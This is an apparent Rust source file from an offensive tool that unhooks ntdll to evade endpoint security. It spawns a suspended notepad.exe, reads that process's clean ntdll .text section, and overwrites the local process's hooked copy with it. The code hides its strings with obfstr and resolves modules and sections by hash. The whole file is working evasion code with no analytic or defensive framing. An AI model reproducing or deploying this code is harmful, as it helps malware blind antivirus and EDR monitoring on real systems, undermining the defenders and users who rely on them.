use obfstr::obfstr;
use std::{ffi::CString, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::GetLastError,
    System::{
        Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
        Threading::{
            CreateProcessA, GetCurrentProcess, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
        },
    },
};

use crate::freeze::pe::get_section_header_by_hash;
mod pe;

const NTDLL_HASH: u32 = 0x1edab0ed; //ntdll.dll
const TEXT_SECTION_HASH: u32 = 0xb6ea858; //.text\0

pub fn freeze() {
    //
    // Step 1) Create a process in a suspended state using `CreateProcessA`
    //
    let process_name = r"C:\Windows\System32\notepad.exe";
    let lp_command_line = CString::new(process_name).unwrap().into_raw() as _;
    let mut startup_info = unsafe { std::mem::zeroed::<STARTUPINFOA>() };
    let mut process_information = unsafe { std::mem::zeroed::<PROCESS_INFORMATION>() };
    let create_process_result = unsafe {
        CreateProcessA(
            null_mut(),
            lp_command_line,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_information,
        )
    };
    log::info!("[+] Process Name: {}", process_name);
    log::info!("[+] Process ID: {}", process_information.dwProcessId);

    if create_process_result == 0 {
        panic!(
            "{} {:#x}",
            obfstr!("[-] Failed to call CreateProcessA"),
            unsafe { GetLastError() }
        );
    }

    //
    // Step 2) Get NTDLL base address of the current/local process
    //
    let ntdll_base = unsafe {
        pe::get_loaded_module_by_hash(NTDLL_HASH).expect(obfstr!("Failed to get module by hash"))
    };
    log::info!("[+] NTDLL Address: {:#x?}", ntdll_base);

    //
    // Step 3) Read the remote processes NTDLL .text section and write it to the local/current processes NTDLL .text section (RPM/WPM)
    //
    unsafe { 
        copy_remote_ntdll_to_local_ntdll_text_section(ntdll_base, TEXT_SECTION_HASH, process_information.hProcess)
    };
    log::info!("Success");
}

/// Copy the remote processes NTDLL .text section to the local/current processes NTDLL .text section
pub unsafe fn copy_remote_ntdll_to_local_ntdll_text_section(ntdll_base: *mut u8, section_hash: u32, remote_process_handle: isize) {

    let section_header = get_section_header_by_hash(ntdll_base, section_hash).expect(obfstr!("Failed to find section header"));

    // get a pointer to the current section header's data
    let source = ntdll_base as usize + (*section_header).PointerToRawData as usize;
    log::info!("[+] Source: {:#x}", source);

    // get the pointer to current section header's virtual address
    let destination = ntdll_base.add((*section_header).VirtualAddress as usize);
    log::info!("[+] Destination: {:?}", destination);

    // get the size of the current section header's data
    let ntdll_text_section_size = (*section_header).SizeOfRawData as usize;
    log::info!("[+] Size: {:?}", ntdll_text_section_size);

    let mut ntdll_text_section_buffer: Vec<u8> = Vec::with_capacity(ntdll_text_section_size as usize);

    let rpm_res = unsafe {
        ReadProcessMemory(
            remote_process_handle,
            source as _, // read the .text section's PointerToRawData using the virtual address
            ntdll_text_section_buffer.as_mut_ptr() as _, // store the .text section's data in a buffer
            ntdll_text_section_size,
            null_mut(),
        )
    };

    if rpm_res == 0 {
        panic!(
            "{} {:#x}",
            obfstr!("[-] Failed to read remote ntdll from the target process"),
            unsafe { GetLastError() }
        );
    }
    
    /* 
    std::ptr::copy_nonoverlapping(
        ntdll_text_section_buffer.as_ptr(),
        destination as _,
        ntdll_text_section_size,
    )*/

    // copy section header into the local process (allocated memory)
    let wpm_res = unsafe {
        WriteProcessMemory(
            GetCurrentProcess(),
            destination as _,
            ntdll_text_section_buffer.as_ptr() as _,
            ntdll_text_section_size,
            null_mut(),
        )
    };

    if wpm_res == 0 {
        panic!(
            "{} {:#x}",
            obfstr!("[-] Failed to write remote .text section to local ntdlls .text section"),
            unsafe { GetLastError() }
        );
    }
}


#[allow(dead_code)]
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
